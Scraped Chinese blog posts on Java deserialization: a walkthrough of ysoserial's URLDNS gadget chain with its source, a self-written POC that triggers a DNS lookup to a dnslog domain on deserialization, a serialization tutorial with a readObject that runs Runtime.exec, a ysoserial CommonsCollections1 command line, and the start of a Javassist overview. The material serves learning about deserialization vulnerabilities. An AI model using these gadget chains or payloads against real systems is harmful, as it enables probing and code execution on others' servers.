src/main/java/ysoserial/GeneratePayload.java\n点击main函数左边的绿色箭头，点击调试，下面就只会打印usage，如下：\n这是因为没加任何参数，所以我们打开Debug Configurations：\n再在这里添加参数即可：\n我这里是添加的DNS，如下：\n然后在URLDNS的getObject()方法加一个断点，再在main函数点击调试就能正常获取值，如下： 可以看出已经正常获取到了值。同理如果想要使用其他诸如CC1之类的链子，就改为 CommomCollections1 'id' 即可。\n利用链分析 从主函数开始，在我传入参数后，来调试看一下\n可以看到此时payloadType的值为URLDNS，那么我们跟进一下getPayloadClass函数，\n可以看出这里使用反射调用了URLDNS类(反射需要注意包的问题)，即URLDNS对应的脚本的class对象并将其return。\n此时就可以看到 payloadClass 的值为 class ysoserial.payloads.URLDNS ，然后我们继续看后续代码，先是使用newInstance()实例化一个对象，然后再调用对象的getObject() 方法，即脚本URLDNS.java的getObject()方法，CTRL+鼠标左键继续跟进这个方法，可以发现定义的一个接口类，应该是URLDNS中重写了这个方法：\n然后继续调试，随后会进入到URLDNS类的getObject()方法，如下：\n这里可以看出URLDNS实现了ObjectPayload接口，在这里URLDNS类重写了 getObject() 方法并且此时的url即为我传进去的域名。\n先继续看main，在getObject()方法后，会调用serialize()方法，跟进看：\n可以看到就是在这里进行了序列化。\n现在继续分析URLDNS链，看URLDNS.java源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 package ysoserial.payloads; import java.io.IOException; import java.net.InetAddress; import java.net.URLConnection; import java.net.URLStreamHandler; import java.util.HashMap; import java.net.URL; import ysoserial.payloads.annotation.Authors; import ysoserial.payloads.annotation.Dependencies; import ysoserial.payloads.annotation.PayloadTest; import ysoserial.payloads.util.PayloadRunner; import ysoserial.payloads.util.Reflections; /** * A blog post with more details about this gadget chain is at the url below: * https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/ * * This was inspired by Philippe Arteau @h3xstream, who wrote a blog * posting describing how he modified the Java Commons Collections gadget * in ysoserial to open a URL. This takes the same idea, but eliminates * the dependency on Commons Collections and does a DNS lookup with just * standard JDK classes. * * The Java URL class has an interesting property on its equals and * hashCode methods. The URL class will, as a side effect, do a DNS lookup * during a comparison (either equals or hashCode). * * As part of deserialization, HashMap calls hashCode on each key that it * deserializes, so using a Java URL object as a serialized key allows * it to trigger a DNS lookup. * * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() * * */ @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34; }) @PayloadTest(skip = \u0026#34;true\u0026#34;) @Dependencies() @Authors({ Authors.GEBL }) public class URLDNS implements ObjectPayload\u0026lt;Object\u0026gt; { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } /** * \u0026lt;p\u0026gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.\u0026lt;/p\u0026gt; * * \u0026lt;b\u0026gt;Potential false negative:\u0026lt;/b\u0026gt; * \u0026lt;p\u0026gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.\u0026lt;/p\u0026gt; */ static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } 里面给了URLDNS的利用链：\n1 2 3 4 5 6 7 /** * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() */ 这里注意看URLDNS类的getObject方法，ysoserial会调用这个方法获得Payload。审这个方法的源码可以发现最后返回的是一个对象，而这个对象就是最后将被序列化的对象，在这里是HashMap。这里看一下利用的getObject()方法，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation---在创建有效负载时避免DNS解析 //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } 这个方法的作用是生成一个构造好了的HashMap对象，该HashMap的键是一个特定的URL对象。当我们在利用时，即HashMap被反序列化时，URL对象会被反序列化并触发DNS请求。 现在来分析一下这个getObject()方法。\n对于第一部分的实例化代码：\n1 URLStreamHandler handler = new SilentURLStreamHandler(); 其中的URLStreamHandler是一个抽象类，所以不能够被实例化，所以这里在URLDNS.java里创建了一个子类SilentURLStreamHandler，并重写了getHostAddress()方法和openConnection()，如下：\n1 2 3 4 5 6 7 8 9 10 11 static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } 那么这里为什么要重写这两个方法呢？对于openConnection()方法，应该是因为父类是抽象类并且子类不是抽象的，所以子类必须将接口方法实现。\n那么为什么要重写getHostAddress()方法呢，如果将这个重写的方法注释掉，那么当我们生成payload时，就会触发DNS请求，我们来看正常的 getHostAddress() 方法\n在这个getHostAddress()方法中，里面的**InetAddress.getByName(host)**方法会去发送请求，所以我们这里重写这个方法，这样在利用这个方法时，不会请求我们的hostAddress。\n还有一个重要的点就是在URL.java中，handler被transinet关键字修饰，在序列化对象的时候，handler属性不会被序列化。所以意味着重写的方法并不会带进我们的payload中，这样我们在触发反序列化漏洞时，getHostAddress并没有被重写，能够正常请求我们的网址。这也是我觉得很精妙的一个地方。\n（这里只需要了解，具体的请求过程看了后文就清楚了）\n现在来看第二部分，也是本篇文章最主要的部分：\n1 2 3 4 5 6 7 HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; 现在来看HashMap类，实现了Serializable接口，重写了readObject()方法\n在之前说过的反序列化的知识点那里可以知道触发反序列化的方法是readObject，并且因为Java开发者（包括Java内置库的开发者）经常会在这⾥⾯写⾃⼰的逻辑，导致在这里可以构造利⽤链。\n现在就看一下HashMap类的readObject()方法，源代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { ObjectInputStream.GetField fields = s.readFields(); // Read loadFactor (ignore threshold) float lf = fields.get(\u0026#34;loadFactor\u0026#34;, 0.75f); if (lf \u0026lt;= 0 || Float.isNaN(lf)) throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); HashMap.UnsafeHolder.putLoadFactor(this, lf); reinitialize(); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal mappings count: \u0026#34; + mappings); } else if (mappings == 0) { // use defaults } else if (mappings \u0026gt; 0) { float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u0026lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; ft \u0026lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what we\u0026#39;re actually creating. SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\u0026#34;rawtypes\u0026#34;,\u0026#34;unchecked\u0026#34;}) Node\u0026lt;K,V\u0026gt;[] tab = (Node\u0026lt;K,V\u0026gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } 主要代码为：\n1 2 3 4 5 6 7 8 9 10 //读取键和值，并将映射放入HashMap中 for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } //跟进源码可以看出这里的readObject最终指向的就是ObjectInputStream类的readObject方法，即在这里反序列化，但是在这里只是HashMap类反序的其中一步。 理解一下代码，可以看出重点在\n1 putVal(hash(key), key, value, false, false); 这个方法的作用为为添加键值对到哈希表，这里先停一下，现在先来看URLDNS类里面使用的对应的HashMao类的put方法，如下：\n1 ht.put(u, url); 我们跟进一下这个put方法的源代码：\n1 2 3 public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } 可以看到这里的put的内容是差不多的，然后在getObject的put方法下断点，强制步入，可以看到如下结果：\n也就是前面反序列化相对应的代码。也就是说，我在HashMap对象中放进的键值对，在反序列化时其实也是调用的同样的代码来放入反序列化得到的HashMap对象中。\n然后继续看HashMap的readObject()中的putVal()方法，里面调用了hash()方法，跟进看一下：\n1 2 3 4 static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } 简单来说就是判断key是否为null，为Null的话就返回0，否则将对key进行使用hashCode()方法后赋值给h并将这个h进行位移16位的异或操作，应该时甲酸哈希值的操作。\n重点就在于这个hashCode()方法，在ysoerial中我们人为地将key改为我们传入的java.net.URL对象，那么现在来看这个类的hashCode()方法：\n1 2 3 4 5 6 7 8 public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } //这里需要注意的就是在调用完hashCode()方法后，变量hashCode的值会被改变。 此时判断这个hashCode是否为为-1，并且在URL类中的hashCode值默认为-1\n这里值为-1，然后继续，当为-1的情况下的handler对象类型为：\n所以这里调用的就是URLStreamHandler类的hashCode()方法（这里强调对象与方法的所属关系，后面拉通来讲很有用），所以源代码为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 //这个方法会发起请求并且计算hashCode的值，所以这里的hashCode会改变 protected int hashCode(URL u) { int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) { h += addr.hashCode(); } else { String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); } // Generate the file part. String file = u.getFile(); if (file != null) h += file.hashCode(); // Generate the port part. if (u.getPort() == -1) h += getDefaultPort(); else h += u.getPort(); // Generate the ref part. String ref = u.getRef(); if (ref != null) h += ref.hashCode(); return h; } u就是我们传入的url，在调用getHostAddress方法时，就会进行DNS查询，方法源代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 synchronized InetAddress getHostAddress() { if (hostAddress != null) { return hostAddress; } if (host == null || host.isEmpty()) { return null; } try { hostAddress = InetAddress.getByName(host); } catch (UnknownHostException | SecurityException ex) { return null; } return hostAddress; } 这里的InetAddress.getByName(host)的作用是根据主机名，获取其IP地址，在网络上其实就是一次DNS查询。\n大致完结，拉通一下，ysoserial链的序列化过程：\n使用自定义的URLDNS类的getObject()方法获取到payload，重点是getObject方法，下面来说一下方法的流程 （在这个方法中，在getObject()方法第一行我们定义了handler，并将其自定义的SilentURLStreamHandler类实例化赋值给handler。 在第二行我们实例化了一个HashMap类。 在第三行实例化了一个URL类，此时URL类中的handler对应的对象为我们自定义的SilentURLStreamHandler类并且注意我们在这个类中重写了getHostAddress()方法 在第四行使用了HashMap类的put方法，这个方法的源码在前面说过，本质差不多，大致为HashMap#putVal()-\u0026gt;HashMap#hash-\u0026gt;URL#hashCode-\u0026gt;handler对象#hashCode。注意，由于此时的handler为我们重写的类，所以最终会调用我们重写的getHostAddress()方法，但是此时会返回null，所以并不会发起请求。 在第五行我们本质上是调用了反射来更改hashCode的值为-1，这是因为我们在前面调用URL#HashCode时会将类里的hashCode改值，这样会导致URL类里面的hashCode值不为-1，所以需要反射改值，这样才能保证在URL类里的hashCode()方法能跳到URLStreamHandler类中。） 最终获取到这个payload后会将其序列化，我们只需要将其反序列化即可访问。 这里的流程也基本将前面讲的几个需要注意的点都说明了，这里就不多说了。\n反序过程：\n反序HashMap类，会调用HashMap类的readObject()方法，其实和前面都大差不差。 可以自己编写一个POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package java_foundation; import java.net.InetAddress; import java.net.URL; import java.net.URLConnection; import java.net.URLStreamHandler; import java.util.HashMap; import java.lang.reflect.Field; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Main { public static void main(String[] args) throws Exception { HashMap hashMap = new HashMap(); URLStreamHandler urlStream = new haha(); URL url = new URL(null,\u0026#34;https://rcpbxasvzr.yutu.eu.org\u0026#34;,urlStream); hashMap.put(url,\u0026#34;fupanc\u0026#34;); Field field = URL.class.getDeclaredField(\u0026#34;hashCode\u0026#34;); field.setAccessible(true); field.set(url,-1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } class haha extends URLStreamHandler{ protected URLConnection openConnection(URL u){ return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } 成功在DNSlog平台上有回显。\n参考文章：\nhttps://blog.csdn.net/qq_48201589/article/details/136049878\nhttps://xz.aliyun.com/t/9417?time__1311=n4%2BxuDgD9AYCqGKDQeDsR32xmrU1bKzte34D\u0026amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F\nhttps://nivi4.notion.site/Java-URLDNS-e9820d5abc6e402abcaf69ef876f74c0\n","date":"2024-07-09T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/urldns/","title":"URLDNS"},{"content":"Java反序列化 在Java中，序列化过程分为两大部分：序列化和反序列化。\n序列化：将对象的状态转换为可存储或传输的格式的过程。例如，将对象转换为字节流或文本格式（如 JSON、XML 等）。这样可以将对象保存到文件、数据库或者通过网络传输。 反序列化：将序列化后的数据恢复为对象的过程。也就是说，将字节流或文本格式的数据重新转换为内存中的对象。 这两部分共同构成了序列化过程，确保对象可以被持久化存储或远程传输，并在需要时恢复原始的对象状态。\n如何实现 在Java中实现对象反序列化非常简单，实现java.io.Serializable（内部序列化）或java.io.Externalizable（外部序列化）接口即可被序列化。下面有几个点需要说明：\nSerializable 接口 源代码如下：\n1 2 public interface Serializable { } 一个对象想要被序列化，那么它的类就要实现此接口或者它的子接口。\n这个对象的所有属性（包括private属性和其引用的对象）都可以被序列化和反序列化来保存、传递。不想序列化的字段可以使用transient修饰。\n由于 Serializable 对象完全以它存储的二进制位为基础来构造，因此并不会调用任何构造函数，因此Serializable类无需默认构造函数，但是当Serializable类的父类没有实现Serializable接口时，反序列化过程会调用父类的默认构造函数，因此该父类必需有默认构造函数，否则会抛异常。\n使用transient关键字阻止序列化虽然简单方便，但被它修饰的属性被完全隔离在序列化机制之外，导致了在反序列化时无法获取该属性的值，而通过在需要序列化的对象的Java类里加入writeObject()方法与readObject()方法可以控制如何序列化各属性，甚至完全不序列化某些属性或者加密序列化某些属性。\n在这里还需要了解一个点，那就是static修饰的字段是绑定在类上的，而不是对象上。static优先于对象存在，所以static修饰的字段不会被序列化。\nExternalizable 接口 对于这个接口的使用可以参考最后面的参考文章。\n源代码如下：\n1 2 3 4 5 6 7 public interface Externalizable extends java.io.Serializable { void writeExternal(ObjectOutput out) throws IOException; void readExternal(ObjectInput in) throws IOException,ClassNotFoundException; } 它是Serializable接口的子类，这个接口里面定义了两个抽象的方法，用户需要重载writeExternal()和readExternal()方法，用来决定如何序列化和反序列化。\n因为序列化和反序列化方法需要自己实现，因此可以指定序列化哪些属性，而transient在这里无效。\n对Externalizable对象反序列化时，会先调用类的无参构造方法，这是有别于默认反序列方式的。如果把类的不带参数的构造方法删除，或者把该构造方法的访问权限设置为private、默认或protected级别，会抛出java.io.InvalidException: no valid constructor异常，因此Externalizable对象必须有默认构造函数，而且必需是public的。\nserialVersionUID字段 这个字段可以在序列化过程中控制序列化的版本。一般格式就是下面这个：\n一个对象数据，在反序列化过程中，如果序列化串中的serialVersionUID与当前对象值不同，则反序列化失败，会报错，否则成功。\n如果serialVersionUID没有显式生成，系统就会自动生成一个。属性的变化都会导致自动生成的serialVersionUID发生变化。如果序列化和反序列化的serialVersionUID不同，则会报序列化版本不同的错误。\n如果我们保持了serialVersionUID的一致，则在反序列化时，对于新增的字段会填入默认值null（int的默认值0）,对于减少的字段则直接忽略。\n其他类 如上图，现在我们来了解一下ObjectInputStream和ObjectOutputStream。\nObjectOutputStream 这个类与序列化相关\n部分源码如下：\n1 2 public class ObjectOutputStream extends OutputStream implements ObjectOutput, ObjectStreamConstants {} java.io.ObjectOutputStream继承自 OutputStream 类，因此可以将序列化后的字节序列写入到文件、网络等输出流中。\n现在来看这个类的构造方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public ObjectOutputStream(OutputStream out) throws IOException { verifySubclass(); bout = new BlockDataOutputStream(out); handles = new HandleTable(10, (float) 3.00); subs = new ReplaceTable(10, (float) 3.00); enableOverride = false; writeStreamHeader(); bout.setBlockDataMode(true); if (extendedDebugInfo) { debugInfoStack = new DebugTraceInfoStack(); } else { debugInfoStack = null; } } 该构造方法接收一个 OutputStream 对象作为参数，并且在实例化时将变量enableOverride设置为false。\n例如：\n1 2 3 4 //这里会创建一个FileOutputStream流以写入数据到File对象所代表的文件 FileOutputStream fos = new FileOutputStream(\u0026#34;file.txt\u0026#34;); // ObjectOutputStream oos = new ObjectOutputStream(fos); 这里序列化想要利用就要用到ObjectOutputStream这个类的writeObject方法，writeObject()方法源码如下：\n前面在实例化时将enableOverride设置为false，所以这里真正起作用的是writeObject0()方法。\nObjectInputStream 这个类和反序列化相关，它可以读取 ObjectOutputStream 写入的字节流，并将其反序列化为相应的对象。\n部分构造函数源码如下：\n1 2 3 4 5 6 7 8 9 public ObjectInputStream(InputStream in) throws IOException { verifySubclass(); bin = new BlockDataInputStream(in); handles = new HandleTable(10); vlist = new ValidationList(); enableOverride = false; readStreamHeader(); bin.setBlockDataMode(true); } 核心方法是readObject()，源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public final Object readObject() throws IOException, ClassNotFoundException { if (enableOverride) { return readObjectOverride(); } // if nested read, passHandle contains handle of enclosing object int outerHandle = passHandle; try { Object obj = readObject0(false); handles.markDependency(outerHandle, passHandle); ClassNotFoundException ex = handles.lookupException(passHandle); if (ex != null) { throw ex; } if (depth == 0) { vlist.doCallbacks(); } return obj; } finally { passHandle = outerHandle; if (closed \u0026amp;\u0026amp; depth == 0) { clear(); } } } 可以看到最后返回的是反序列化后的对象。\n序列化 测试代码如下：\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; import java.io.Serializable; class Test implements Serializable{ private String name = \u0026#34;fupanc\u0026#34; ; protected char height = \u0026#39;A\u0026#39; ; public transient String sex = \u0026#34;boy\u0026#34;; private static int age = 1111 ; public void setName(String name){ this.name=name; } public String getName(){ return this.name; } public String getSex(){ return this.sex; } public int getAge(){ return this.age; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package org.example; import java.io.ObjectOutputStream; import java.io.FileOutputStream; class Main{ public static void main(String[] args) throws Exception { Test p = new Test(); p.setName(\u0026#34;haha\u0026#34;); ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(p); x.close(); } } 成功生成ser.ser文件，十六进制打开看一下，如下：\n可以看出这里只序列化了height和name，而sex和age并没有被序列化。所以在这里就可以知道正如前面说的，使用transient和static修饰的变量不会被序列化。\n反序列化 反序列化对象时有如下限制：\n被反序列化的类必须存在。 serialVersionUID值必须一致。 同样使用上面的Test.java。这里就只给Main.java，反序列化代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package org.example; import java.io.FileInputStream; import java.io.ObjectInputStream; class Main { public static void main(String[] args) throws Exception { ObjectInputStream p = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); Test ctf = (Test)p.readObject();//这里由于返回类型不同，需要强制转换 System.out.println(\u0026#34;反序列化后的name:\u0026#34;+ctf.getName()); System.out.println(\u0026#34;反序列化后的sex:\u0026#34;+ctf.getSex()); System.out.println(\u0026#34;反序列化后的age:\u0026#34;+ctf.getAge()); } } 输出结果如下：\n1 2 3 反序列化后的name:haha 反序列化后的sex:null 反序列化后的age:1111 解读一下结果：\nsex为null，就是因为我在Test类用transient修饰，所以在序列化时并不会将sex字段序列化，所以这里并没有值。 age为1111，这就与static有关了，这是因为static为全局变量，在JVM中所有实例都会共享该字段。 对比一下，刚好可以再说明一个点\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example; import java.io.Serializable; class Test implements Serializable{ private static String name = \u0026#34;fupanc\u0026#34; ; //这里添加static public String sex = \u0026#34;boy\u0026#34;; //这里去除transient private static int age = 1111 ; public void setName(String name){ this.name=name; } public String getName(){ return this.name; } public String getSex(){ return this.sex; } public int getAge(){ return this.age; } } Main.java (省去序列化过程，注意这里是将序列化和反序列化分开进行的)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; class Main{ public static void main(String[] args){ try{ //反序列化 ObjectInputStream y = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); Test ctf = (Test)y.readObject(); System.out.println(\u0026#34;反序列化后的name:\u0026#34;+ctf.getName()); System.out.println(\u0026#34;反序列化后的sex:\u0026#34;+ctf.getSex()); System.out.println(\u0026#34;反序列化后的age:\u0026#34;+ctf.getAge()); } catch(Exception e){ e.printStackTrace(); } } } 输出为：\n1 2 3 反序列化后的name:fupanc 反序列化后的sex:boy 反序列化后的age:1111 从这个结果可以更加说明static修饰的字段不会被序列化的特性，以及更加清楚了是否使用transient结果的不同。\n但是在前一个测试过程中，发现了一个问题，\nTest.java还是之前那个：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example; import java.io.Serializable; class Test implements Serializable{ private static String name = \u0026#34;fupanc\u0026#34; ; //这里添加static public String sex = \u0026#34;boy\u0026#34;; //这里去除transient private static int age = 1111 ; public void setName(String name){ this.name=name; } public String getName(){ return this.name; } public String getSex(){ return this.sex; } public int getAge(){ return this.age; } } Main.java内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package org.example; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; class Main{ public static void main(String[] args){ try{ //序列化 Test p = new Test(); p.setName(\u0026#34;haha\u0026#34;); ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(p); x.close(); //反序列化 ObjectInputStream y = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); Test ctf = (Test)y.readObject(); System.out.println(\u0026#34;反序列化后的name:\u0026#34;+ctf.getName()); System.out.println(\u0026#34;反序列化后的sex:\u0026#34;+ctf.getSex()); System.out.println(\u0026#34;反序列化后的age:\u0026#34;+ctf.getAge()); } catch(Exception e){ e.printStackTrace(); } } } 运行结果：\n1 2 3 反序列化后的name:haha 反序列化后的sex:boy 反序列化后的age:1111 注意这里的name的结果为haha，但是之前分开序列化和反序列化时的name的值为fupanc。那么为什么会出现这样的结果呢？解答如下（个人理解）：\n有想过为什么在反序列化的时候要引入包吗，\n同时可以看给出来的ser.ser文件的十六进制表示，其中并没有序列化方法，并且只存在sex（这是因为其他两个变量都被我设置为了static，所以不会被序列化），那么是否想过为什么在序列化的时候没有序列化方法。\n个人理解如下，对于序列化，它只序列化对象的的状态，而方法属于类的定义部分，不属于对象的状态部分，所以方法并不是被序列化，所以，如果我们想要再次利用这个Test类，需要引入包，从而使得可以对应到方法来利用。\n两种不同结果的利用方法最大的不同在于一个地方，JVM加载进程。\n在分开序列化和反序列化时，是分别运行了两次，即进行了两次JVM加载，但是这个static静态加载是存在于“当前”进程的，并且看前面序列化后的文件内容，是不存在static关键字修饰的变量的，static修饰的变量是绑定在对象上的，而是直接存在于内存中的，所以在第二次加载时会直接将内存中存在的fupanc赋值给name。\n而序列化和反序列化一起，对比一下，基本就清楚了，同时进行，在序列化之前将static修饰的name改为haha，并加载进了内存中，然后在反序列化时直接在内存中找到了这个值赋值给了name。\n综上，造成这个差异的主要有两个点：\n序列化的特性 “JVN加载特性” 一个知识点 这里需要注意的一个点，我们可以通过在待序列化或反序列化的类中定义readObject和writeObject方法，来实现自定义的序列化和反序列化操作，当然前提是，被序列化的类必须有此方法，并且方法的修饰符必须是private。代码参考如下：\nTest.java\n1 2 3 4 5 6 7 8 9 10 package org.example; import java.io.Serializable; class Test implements Serializable{ public String cmd; private void readObject(java.io.ObjectInputStream stream) throws Exception{ stream.defaultReadObject();//调用ObjectInputStream默认反序列化方法 Runtime.getRuntime().exec(cmd); } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import java.io.*; class Main{ public static void main(String[] args) throws Exception{ Test haha = new Test(); haha.cmd = \u0026#34;calc\u0026#34;; ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(\u0026#34;haha.ser\u0026#34;)); obj.writeObject(haha); obj.close(); ObjectInputStream ceshi = new ObjectInputStream(new FileInputStream(\u0026#34;haha.ser\u0026#34;)); ceshi.readObject(); ceshi.close(); } } 成功弹出计算机\n这样就确实自定义了反序列化的方法，序列化同理。\nysoserial工具 ysoserial集合了各种java反序列化的利用链。\n利用链也叫\u0026quot;gadget chains\u0026quot;，我们通常称为gadget。\n直接下载编译好的jar文件就能用：\n1 https://github.com/frohoff/ysoserial 使用很简单，如下简单POC：\n1 java -jar ysoserial-master.jar CommonsCollections1 \u0026#34;id\u0026#34; 参考文章：\nhttps://javasec.org/javase/JavaDeserialization/Serialization.html\nhttps://blog.csdn.net/mocas_wang/article/details/107621010\n","date":"2024-07-03T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Java反序列化"},{"content":"Java Javassist 概述 Java programming ASSISTant，Java编程助手。是Java中编辑字节码的类库。它可以在Java程序运行时定义一个新的类，并加载到JVM中；还可以在JVM加载时修改一个类文件。\nJava中所有的类都被编译为class文件来运行，在编译完class文件之后，类不能再被显式修改，而Javassist就是用来处理编译后的class文件，它可以用来修改方法或者新增方法，并且不需要深入了解字节码，还可以生成一个新的类对象。\nJavassist核心API ClassPool 这个类是javassist的核心组件之一。ClassPool是CtClass对象容器，\n常用方法：\nClassPool getDefault()：返回默认的ClassPool，一般通过该方法创建我们的ClassPool； ClassPool insertClassPath(ClassPath cp)：将一个ClassPath对象插入到类搜索路径的起始位置，也就是向ClassPool容器插入一个.class对象。 ClassPool appendClassPath：将一个ClassPath对象加到类搜索路径的末尾位置； CtClass makeClass(java.lang.String classname)：根据类名创建新的CtClass对象。类名必须是全量类名。 CtClass get(java.lang.String classname)：从源中读取类文件，并返回对CtClass来表示对该类文件的对象的引用。 CtClass 在javassist中每个需要编译的class都对应一个CtClass实例，CtClass（compile time class），这些类会存储在ClassPool中。所以CtClass对象必须从该对象容器中获取。\n常用方法：\nvoid setSuperclass(CtClass clazz)：更改超类（父类），除非此对象表示接口。 byte[] toBytecode()：将该类转换为类文件，即将CtClass对象cc转换为字节码数组； CtConstructor 